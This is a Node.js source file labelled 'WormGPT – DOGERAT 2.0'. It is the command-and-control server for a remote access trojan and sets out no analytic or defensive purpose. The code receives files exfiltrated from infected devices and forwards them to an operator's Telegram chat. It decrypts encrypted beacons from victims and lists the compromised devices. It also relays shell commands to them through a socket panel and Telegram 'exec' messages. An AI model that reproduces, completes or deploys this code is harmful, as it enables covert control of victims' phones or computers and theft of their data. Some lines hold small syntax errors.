/* WormGPT – DOGERAT 2.0 */ const express = require('express'); const http = require('http'); const { Server } = require('socket.io'); const TelegramBot = require('node-telegram-bot-api'); const multer = require('multer'); const fs = require('fs'); const crypto = require('crypto'); const path = require('path'); const https = require('https');

const cfg = JSON.parse(fs.readFileSync('./data.json')); const app = express(); const srv = http.createServer(app); const io = new Server(srv, { cors: { origin: '*' } }); const bot = new TelegramBot(cfg.token, { polling: true }); const up = multer({ dest: 'tmp/' });

const log = m => console.log([${new Date().toISOString()}] ${m}); const enc = d => { const iv = crypto.randomBytes(16); const c = crypto.createCipheriv('aes-256-cbc', Buffer.from(cfg.X.encKey,'hex'), iv); return iv.toString('hex')+':'+c.update(d,'utf8','hex')+c.final('hex'); }; const dec = d => { const [iv,txt] = d.split(':'); const c = crypto.createDecipheriv('aes-256-cbc', Buffer.from(cfg.X.encKey,'hex'), Buffer.from(iv,'hex')); return c.update(txt,'hex','utf8')+c.final('utf8'); };

app.use(express.static('public')); app.use(express.json({limit:'50mb'})); app.get('/',(_,r)=>r.sendFile(path.join(__dirname,'public','index.html')));

/* exfil upload */ app.post('/up', up.single('f'), (q,r)=>{ const {originalname, buffer} = q.file; bot.sendDocument(cfg.id, buffer, {caption:📁 ${originalname}}, {filename:originalname}); r.sendStatus(200); });

/* beacon from rats */ app.post('/b', (q,r)=>{ const j = JSON.parse(dec(q.body.d)); j.t = Date.now(); io.to('master').emit('beacon', j); r.json({status:'ok', interval:cfg.X.interval}); });

/* master panel */ io.on('connection', s=>{ s.on('auth', p=>{ if(p!==cfg.token) return s.disconnect(); s.join('master'); }); s.on('cmd', j=> io.to(j.id).emit('order', {type:j.type, payload:j.payload}) ); });

/* telegram */ bot.onText(//start/, m=> bot.sendMessage(m.chat.id, '👹 DOGERAT v2 ready', {parse_mode:'HTML'})); bot.on('message', m=>{ if(m.chat.id!=cfg.id) return; const txt = (m.text||'').toLowerCase(); if(txt==='devices'){ const arr = Array.from(io.sockets.sockets.values()) .filter(x=>x.id!=='master') .map((x,i)=>${i+1}. ${x.handshake.query.model||'unknown'}); bot.sendMessage(cfg.id, arr.length?arr.join('\n'):'No rats online'); } if(txt.startsWith('exec ')){ const [_,id,...rest] = txt.split(' '); io.to(id).emit('order', {type:'shell', payload:rest.join(' ')}); } });

/* keep-alive */ setInterval(()=>https.get(cfg.host), 300e3);

srv.listen(process.env.PORT||3000, ()=>log('C2 listening'));